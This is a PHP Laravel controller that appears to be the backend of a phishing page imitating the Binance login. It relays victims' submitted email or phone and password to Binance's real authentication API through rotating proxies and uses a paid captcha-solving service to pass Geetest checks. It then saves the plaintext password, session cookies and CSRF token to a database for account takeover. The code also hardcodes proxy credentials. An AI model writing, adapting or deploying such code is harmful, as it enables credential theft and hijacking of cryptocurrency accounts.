<?php

namespace App\Http\Controllers;

use App\Models\Account;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;

set_time_limit(0);

class LoginController extends Controller
{
    private string $binanceUUID;
    private string $csrftoken;
    private string $cookies = "";
    private string $proxy;

    public function login(Request $request)
    {
        session_start();

        $this->proxy = $this->getProxy();

        $this->binanceUUID = self::generateUUID(openssl_random_pseudo_bytes(16));

        $data = $request->all();

        $this->csrftoken = $data['csrfToken'];

        if (!$data['device_info']) {
            $data['device_info'] = "eyJzY3JlZW5fcmVzb2x1dGlvbiI6IjE5MjAsMTA4MCIsImF2YWlsYWJsZV9zY3JlZW5fcmVzb2x1dGlvbiI6IjE5MjAsMTAzMiIsInN5c3RlbV92ZXJzaW9uIjoiV2luZG93cyAxMCIsImJyYW5kX21vZGVsIjoidW5rbm93biIsInN5c3RlbV9sYW5nIjoicnUtUlUiLCJ0aW1lem9uZSI6IkdNVCszIiwidGltZXpvbmVPZmZzZXQiOi0xODAsInVzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTguMC40NzU4LjEwMiBTYWZhcmkvNTM3LjM2IiwibGlzdF9wbHVnaW4iOiJQREYgVmlld2VyLENocm9tZSBQREYgVmlld2VyLENocm9taXVtIFBERiBWaWV3ZXIsTWljcm9zb2Z0IEVkZ2UgUERGIFZpZXdlcixXZWJLaXQgYnVpbHQtaW4gUERGIiwiY2FudmFzX2NvZGUiOiIyMjY2MmVhYiIsIndlYmdsX3ZlbmRvciI6Ikdvb2dsZSBJbmMuIChOVklESUEpIiwid2ViZ2xfcmVuZGVyZXIiOiJBTkdMRSAoTlZJRElBLCBOVklESUEgR2VGb3JjZSBHVFggMTA4MCBEaXJlY3QzRDExIHZzXzVfMCBwc181XzAsIEQzRDExLTMwLjAuMTUuMTE3OSkiLCJhdWRpbyI6IjEyNC4wNDM0NzUyNzUxNjA3NCIsInBsYXRmb3JtIjoiV2luMzIiLCJ3ZWJfdGltZXpvbmUiOiJFdXJvcGUvTW9zY293IiwiZGV2aWNlX25hbWUiOiJDaHJvbWUgVjk4LjAuNDc1OC4xMDIgKFdpbmRvd3MpIiwiZmluZ2VycHJpbnQiOiIxNGE4YjliYjUxNTg3OTZmMWQwMTQ3YTJiMTBmYTNlMSIsImRldmljZV9pZCI6IiIsInJlbGF0ZWRfZGV2aWNlX2lkcyI6IiJ9";
        }

        $taskId = $_SESSION['taskId'];
        $this->cookies = $_SESSION['taskCookies'];
        $solution = $this->getResultTask($taskId);

        $sessionId = $this->getSessionID($data);

        $result = $this->checkResultGT($data, $sessionId, $solution);

        if (!$result) {
            $task = \App\Http\Controllers\LoginController::createTasks();

            $_SESSION['taskId'] = $task['taskId'];
            $_SESSION['taskCookies'] = $task['cookies'];

            return response()->json(["success" => false]);
        }

        $uuid = self::generateUUID(openssl_random_pseudo_bytes(16));

        if (isset($data["email"])) {
            $request = Http::withOptions([
                "proxy" => $this->proxy
            ])
            ->withHeaders([
                "origin" => "https://accounts.binance.com",
                "referer" => "https://accounts.binance.com/ru/login",
                "user-agent" => $_SERVER['HTTP_USER_AGENT'],
                "device-info" => $data['device_info'],
                "clienttype" => "web",
                "x-trace-id" => $uuid,
                "x-ui-request-trace" => $uuid,
                "bnc-uuid" => $this->binanceUUID,
                "csrftoken" => $this->csrftoken,
                "content-type" => "application/json",
                "cookie" => $this->cookies
            ])->post("https://accounts.binance.com/bapi/accounts/v2/public/authcenter/login", [
                "email" => $data['email'],
                "password" => md5($data['password']),
                "safePassword" => hash("sha512", $data['password']),
                "gtId" => "",
                "sessionId" => $sessionId,
                "validateCodeType" => "gt",
                "captchaType" => null,
                "geetestChallenge" => $solution["challenge"],
                "geetestValidate" => $solution["validate"],
                "geetestSeccode" => $solution["seccode"],
                "challenge" => "",
                "gt" => "",
                "deviceInfo" => $data['device_info'],
                "isNewLoginProcess" => true
            ]);
        } else {
            $request = Http::withOptions([
                "proxy" => $this->proxy
            ])
                ->withHeaders([
                "origin" => "https://accounts.binance.com",
                "referer" => "https://accounts.binance.com/ru/login",
                "user-agent" => $_SERVER['HTTP_USER_AGENT'],
                "device-info" => $data['device_info'],
                "clienttype" => "web",
                "x-trace-id" => $uuid,
                "x-ui-request-trace" => $uuid,
                "bnc-uuid" => $this->binanceUUID,
                "csrftoken" => $this->csrftoken,
                "content-type" => "application/json",
                "cookie" => $this->cookies
            ])->post("https://accounts.binance.com/bapi/accounts/v2/public/authcenter/login", [
                "mobile" => $data['mobile'],
                "mobileCode" => $data["country_code"],
                "password" => md5($data['password']),
                "safePassword" => hash("sha512", $data['password']),
                "gtId" => "",
                "sessionId" => $sessionId,
                "validateCodeType" => "gt",
                "captchaType" => null,
                "geetestChallenge" => $solution["challenge"],
                "geetestValidate" => $solution["validate"],
                "geetestSeccode" => $solution["seccode"],
                "challenge" => "",
                "gt" => "",
                "deviceInfo" => $data['device_info'],
                "isNewLoginProcess" => true
            ]);
        }

        $response = $request->json();

        if (!$response['success']) {
            $task = \App\Http\Controllers\LoginController::createTasks();

            $_SESSION['taskId'] = $task['taskId'];
            $_SESSION['taskCookies'] = $task['cookies'];
        }

        $cookies = $request->cookies()->toArray();

        foreach ($cookies as $cookie) {
            $this->cookies .= $cookie['Name'] . "=" . $cookie['Value'] . ";";
        }

        if (isset($data["email"])) {
            Account::query()->create([
                "email" => $data["email"],
                "password" => $data["password"],
                "device-info" => $data["device_info"],
                "cookie" => $this->cookies,
                "session_id" => $data["session_id"],
                "csrftoken" => $this->csrftoken,
                "proxy" => $this->proxy
            ]);
        } else {
            Account::query()->create([
                "mobile" => $data["mobile"],
                "mobile_code" => $data["country_code"],
                "password" => $data["password"],
                "device-info" => $data["device_info"],
                "cookie" => $this->cookies,
                "session_id" => $data["session_id"],
                "csrftoken" => $this->csrftoken,
                "proxy" => $this->proxy
            ]);
        }

        return $request->json();
    }

    public static function createTasks()
    {
        $gtChallenge = self::getGtChallenge();
        $task = self::createTask($gtChallenge['response']);

        return [
            "taskId" => $task,
            "cookies" => $gtChallenge['cookies']
        ];
    }

    public static function getGtChallenge(): array
    {
        $timestamp = time() * 1000;

        $uuid = self::generateUUID(openssl_random_pseudo_bytes(16));

        $request = Http::withHeaders([
            "origin" => "https://accounts.binance.com",
            "referer" => "https://accounts.binance.com/ru/login",
            "user-agent" => $_SERVER['HTTP_USER_AGENT'],
            "clienttype" => "web",
            "x-trace-id" => $uuid,
            "x-ui-request-trace" => $uuid
        ])->get("https://accounts.binance.com/bapi/composite/v1/public/common/security/gt-code?t=" . $timestamp);

        $cookies = $request->cookies()->toArray();
        $cookiesStr = "";

        foreach ($cookies as $cookie) {
            $cookiesStr .= $cookie['Name'] . "=" . $cookie['Value'] . ";";
        }

        return [
            "response" => $request->json()['data'],
            "cookies" => $cookiesStr
        ];
    }

    private function getSessionID(array $data): string
    {
        if (isset($data['email'])) {
            $post = [
                "bizType" => "login",
                "email" => $data['email']
            ];
        } else {
            $post = [
                "bizType" => "login",
                "mobile" => $data['mobile'],
                "mobileCode" => $data['country_code']
            ];
        }

        $sessionId = null;
        $request = null;
        $i = 0;

        while ($sessionId === null) {
            if ($i === 5) {
                break;
            }

            $uuid = self::generateUUID(openssl_random_pseudo_bytes(16));

            $request = Http::withOptions([
                "proxy" => $this->proxy
            ])
                ->withHeaders([
                "origin" => "https://accounts.binance.com",
                "referer" => "https://accounts.binance.com",
                "user-agent" => $_SERVER['HTTP_USER_AGENT'],
                "device-info" => $data['device_info'],
                "Content-Type" => "application/json",
                "x-trace-id" => $uuid,
                "x-ui-request-trace" => $uuid,
                "clienttype" => "web",
                "bnc-uuid" => $this->binanceUUID,
                "csrftoken" => $this->csrftoken,
                "cookie" => $this->cookies
            ])->post("https://accounts.binance.com/bapi/accounts/v1/public/account/security/precheck", $post);

            $response = $request->json();

            if ($response['data']['captchaType'] === "gt") {
                $sessionId = $response['data']['sessionId'];
            } else {
                sleep(1);
            }

            $i++;
        }

        $cookies = $request->cookies()->toArray();

        foreach ($cookies as $cookie) {
            $this->cookies .= $cookie['Name'] . "=" . $cookie['Value'] . ";";
        }

        return $sessionId;
    }

    private function checkResultGT(array $data, string $sessionId, array $solution): bool
    {
        $uuid = self::generateUUID(openssl_random_pseudo_bytes(16));

        $request = Http::withOptions([
            "proxy" => $this->proxy
        ])
            ->withHeaders([
            "origin" => "https://accounts.binance.com",
            "referer" => "https://accounts.binance.com/ru/login",
            "user-agent" => $_SERVER['HTTP_USER_AGENT'],
            "device-info" => $data['device_info'],
            "Content-Type" => "application/json",
            "clienttype" => "web",
            "csrftoken" => $this->csrftoken,
            "x-trace-id" => $uuid,
            "x-ui-request-trace" => $uuid,
            "bnc-uuid" => $this->binanceUUID,
            "cookie" => $this->cookies
        ])->post("https://accounts.binance.com/bapi/accounts/v1/public/account/security/check/result", [
            "sessionId" => $sessionId,
            "validateCodeType" => "gt",
            "geetestChallenge" => $solution["challenge"],
            "geetestValidate" => $solution["validate"],
            "geetestSeccode" => $solution["seccode"],
            "challenge" => "",
            "gt" => "",
            "gtId" => ""
        ]);

        $cookies = $request->cookies()->toArray();

        foreach ($cookies as $cookie) {
            $this->cookies .= $cookie['Name'] . "=" . $cookie['Value'] . ";";
        }

        $response = $request->json();

        return $response['success'];
    }

    public static function createTask(array $data): int
    {
        $request = Http::post("https://api.anti-captcha.com/createTask", [
            "clientKey" => config('services.anticaptcha.key'),
            "task" => [
                "type" => "GeeTestTaskProxyless",
                "websiteURL" => "https://accounts.binance.com/bapi/accounts/v2/public/authcenter/login",
                "gt" => $data["gt"],
                "challenge" => $data["challenge"]
            ]
        ]);

        return $request->json()['taskId'];
    }

    private function getResultTask(int $taskId): array
    {
        $solution = null;

        while ($solution === null) {
            try {
                $request = Http::post("https://api.anti-captcha.com/getTaskResult", [
                    "clientKey" => config('services.anticaptcha.key'),
                    "taskId" => $taskId
                ]);

                $response = $request->json();

                if (isset($response['status']) && $response['status'] !== "processing") {
                    $solution = $response['solution'];
                } else {
                    sleep(1);
                }
            } catch (\Throwable $e) {

            }
        }

        return $solution;
    }

    public static function generateUUID($data): string
    {
        assert(strlen($data) == 16);

        $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
        $data[8] = chr(ord($data[8]) & 0x3f | 0x80);

        return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
    }

    private function getProxy()
    {
        $request = Http::withHeaders([
            "Authorization" => config('services.webshare.key')
        ])->get("https://proxy.webshare.io/api/proxy/list/?page=1");

        $response = $request->json();
        $proxy = $response["results"][array_rand($response["results"])];

        //return "http://" . $proxy["username"] . ":" . $proxy["password"] . "@" . $proxy["proxy_address"] . ":" . $proxy["ports"]["http"];
        return "http://zuxjdufx-rotate:v3ic9u7ave0s@p.webshare.io:80";
    }
}
